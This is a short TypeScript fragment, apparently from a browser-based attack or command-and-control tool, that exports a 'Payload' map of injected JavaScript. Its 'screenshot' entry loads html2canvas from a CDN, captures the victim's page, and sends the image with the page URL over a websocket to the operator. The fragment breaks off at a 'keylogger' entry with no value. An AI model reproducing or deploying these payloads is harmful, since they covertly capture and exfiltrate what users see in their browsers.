export const Payload: { [key: string]: string } = {
  ...
  screenshot:
    "import('https://cdnjs.cloudflare.com/ajax/libs/html2canvas/0.5.0-beta4/html2canvas.min.js').then(()=>html2canvas().then(c=>socket.send(JSON.stringify({[window.location.href]:c.toDataURL()}))))||`Please wait for screenshot`",
  keylogger:
